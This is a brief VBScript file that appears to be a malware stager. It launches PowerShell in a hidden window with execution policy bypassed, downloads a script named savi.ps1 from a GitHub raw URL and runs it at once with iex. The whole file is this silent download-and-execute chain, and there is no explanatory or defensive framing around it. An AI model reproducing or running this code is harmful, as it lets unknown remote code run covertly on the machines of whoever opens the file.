Set o=CreateObject("WScript.Shell")
a="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
b="$u='https://github.com/C4sp3n-bit/tuba/raw/refs/heads/main/savi.ps1';"
c="iex(iwr $u -UseBasicParsing).Content"
o.Run a & Chr(34) & b & c & Chr(34), 0, False
